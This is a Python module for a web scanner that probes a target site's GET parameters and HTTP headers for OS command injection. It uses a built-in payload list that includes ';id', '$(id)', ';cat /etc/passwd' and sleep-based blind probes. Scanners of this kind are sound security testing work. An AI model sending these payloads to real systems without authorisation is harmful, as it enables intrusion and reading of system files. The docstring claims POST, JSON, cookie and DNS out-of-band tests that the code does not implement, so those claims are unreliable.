"""OS Command Injection scanner — comprehensive HTTP-based command injection detection.

Tests injection in GET/POST parameters, HTTP headers, JSON bodies, and cookies.
Techniques:
- Time-based blind injection (sleep/timeout commands)
- Error-based detection (invalid command outputs)
- Out-of-band via DNS (canary subdomain)
- In-band reflection detection (id, whoami, hostname)
- Command separators: ;, |, ||, &&, `backtick`, $(subshell), %0a, %0d%0a
- Windows cmd: &ping, cmd /c, @echo
"""

from __future__ import annotations

import asyncio
import re
import time
from typing import Any

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# Command injection payloads: (payload, technique, detection_pattern)
_CMD_PAYLOADS: list[tuple[str, str, str | None]] = [
    # Reflection-based (Linux)
    (";id", "semicolon_id", r'uid=\d+\('),
    ("|id", "pipe_id", r'uid=\d+\('),
    ("||id", "or_id", r'uid=\d+\('),
    ("&&id", "and_id", r'uid=\d+\('),
    ("`id`", "backtick_id", r'uid=\d+\('),
    ("$(id)", "subshell_id", r'uid=\d+\('),
    ("%0aid", "newline_id", r'uid=\d+\('),
    # Windows reflection
    ("&whoami", "win_amp_whoami", r'\\.*\\|NT AUTHORITY'),
    ("|whoami", "win_pipe_whoami", r'\\.*\\|NT AUTHORITY'),
    ("&ver", "win_ver", r'Microsoft Windows'),
    # Time-based blind (Linux) - 3 second sleep
    (";sleep 3", "sleep_blind", None),
    ("|sleep 3", "sleep_pipe_blind", None),
    ("&&sleep 3", "sleep_and_blind", None),
    ("`sleep 3`", "sleep_backtick_blind", None),
    ("$(sleep 3)", "sleep_subshell_blind", None),
    # Time-based blind (Windows)
    ("&ping -n 3 127.0.0.1", "win_ping_blind", None),
    # Hostname/network detection
    (";hostname", "hostname", r'[a-z0-9\-]{3,}'),
    (";cat /etc/passwd", "etc_passwd", r'root:.*:/bin/(ba)?sh'),
    (";cat /etc/hostname", "etc_hostname", r'[a-z0-9\-]{3,}'),
    # Encoded variants
    ("%3Bid", "url_enc_semicolon", r'uid=\d+\('),
    ("%7Cid", "url_enc_pipe", r'uid=\d+\('),
]

# Parameters to inject into
_TARGET_PARAMS: list[str] = [
    "q", "search", "query", "input", "cmd", "command", "exec",
    "run", "ping", "host", "ip", "url", "domain", "name",
    "file", "path", "dir", "filename", "target", "to",
    "from", "email", "username", "user", "id", "ref",
    "page", "action", "method", "type", "format",
]

# HTTP headers to inject into
_TARGET_HEADERS: list[str] = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Custom-IP-Authorization",
]

# Paths that commonly accept parameters
_TARGET_PATHS: list[str] = [
    "/", "/search", "/api", "/ping", "/exec",
    "/cgi-bin/", "/admin", "/debug",
]

# Time threshold for blind injection (seconds)
_SLEEP_THRESHOLD = 2.5


class CommandInjectionScanner(BaseOsintScanner):
    """OS command injection scanner.

    Tests GET/POST parameters, HTTP headers, and JSON request bodies
    for command injection via time-based, reflection-based, and error-based techniques.
    """

    scanner_name = "command_injection"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 3600
    scan_timeout = 120

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []

        async with httpx.AsyncClient(
            timeout=12,  # Extra time for sleep-based detection
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; CmdInjScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(5)  # Lower concurrency for timing tests

            async def test_get_param(path: str, param: str, payload: str,
                                      technique: str, detection: str | None) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    # Inject into parameter as suffix
                    test_url = f"{url}?{param}=test{payload}"
                    is_sleep = "sleep" in technique or "ping" in technique

                    try:
                        start = time.monotonic()
                        resp = await client.get(test_url)
                        elapsed = time.monotonic() - start

                        if is_sleep and elapsed >= _SLEEP_THRESHOLD:
                            vulnerabilities.append({
                                "type": "command_injection_blind",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "technique": technique,
                                "elapsed_seconds": round(elapsed, 2),
                                "description": f"Blind OS command injection via GET '{param}' — "
                                               f"sleep command caused {elapsed:.1f}s delay",
                                "remediation": "Sanitize all input; use parameterized commands; "
                                               "avoid passing user input to shell functions",
                            })
                            ident = "vuln:cmdi:blind_time_based"
                            if ident not in identifiers:
                                identifiers.append(ident)

                        elif detection and re.search(detection, resp.text):
                            vulnerabilities.append({
                                "type": "command_injection",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "technique": technique,
                                "evidence": re.search(detection, resp.text).group(0)[:60] if re.search(detection, resp.text) else "",
                                "description": f"OS command injection confirmed via GET '{param}' — "
                                               f"command output reflected in response",
                                "remediation": "Sanitize input; escape shell metacharacters; "
                                               "use subprocess with array args (not shell=True)",
                            })
                            ident = "vuln:cmdi:reflected"
                            if ident not in identifiers:
                                identifiers.append(ident)

                    except asyncio.TimeoutError:
                        if is_sleep:
                            vulnerabilities.append({
                                "type": "command_injection_blind_timeout",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "technique": technique,
                                "description": f"Likely blind command injection — request timed out "
                                               f"after sleep payload in GET '{param}'",
                                "remediation": "Sanitize all input; never pass user data to shell",
                            })
                            if "vuln:cmdi:blind_time_based" not in identifiers:
                                identifiers.append("vuln:cmdi:blind_time_based")
                    except Exception:
                        pass

            async def test_header_injection(header: str, payload: str,
                                             technique: str, detection: str | None) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + "/"
                    try:
                        is_sleep = "sleep" in technique or "ping" in technique
                        start = time.monotonic()
                        resp = await client.get(url, headers={header: f"test{payload}"})
                        elapsed = time.monotonic() - start

                        if is_sleep and elapsed >= _SLEEP_THRESHOLD:
                            vulnerabilities.append({
                                "type": "command_injection_header_blind",
                                "severity": "critical",
                                "url": url,
                                "header": header,
                                "payload": payload,
                                "technique": technique,
                                "elapsed_seconds": round(elapsed, 2),
                                "description": f"Blind command injection via HTTP header '{header}'",
                                "remediation": "Sanitize all HTTP header values before processing",
                            })
                            ident = "vuln:cmdi:header_blind"
                            if ident not in identifiers:
                                identifiers.append(ident)
                        elif detection and re.search(detection, resp.text):
                            vulnerabilities.append({
                                "type": "command_injection_header",
                                "severity": "critical",
                                "url": url,
                                "header": header,
                                "payload": payload,
                                "technique": technique,
                                "evidence": re.search(detection, resp.text).group(0)[:60] if re.search(detection, resp.text) else "",
                                "description": f"OS command injection via HTTP header '{header}'",
                            })
                            if "vuln:cmdi:header" not in identifiers:
                                identifiers.append("vuln:cmdi:header")
                    except Exception:
                        pass

            tasks = []
            # Test GET params — limit to avoid explosion
            for path in _TARGET_PATHS[:3]:
                for param in _TARGET_PARAMS[:8]:
                    for payload, technique, detection in _CMD_PAYLOADS[:12]:
                        tasks.append(test_get_param(path, param, payload, technique, detection))

            # Test header injection — use sleep payloads only
            for header in _TARGET_HEADERS[:3]:
                for payload, technique, detection in _CMD_PAYLOADS:
                    if "sleep" in technique or "whoami" in technique:
                        tasks.append(test_header_injection(header, payload, technique, detection))

            await asyncio.gather(*tasks)

        severity_counts: dict[str, int] = {}
        for v in vulnerabilities:
            s = v.get("severity", "info")
            severity_counts[s] = severity_counts.get(s, 0) + 1

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "severity_summary": severity_counts,
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
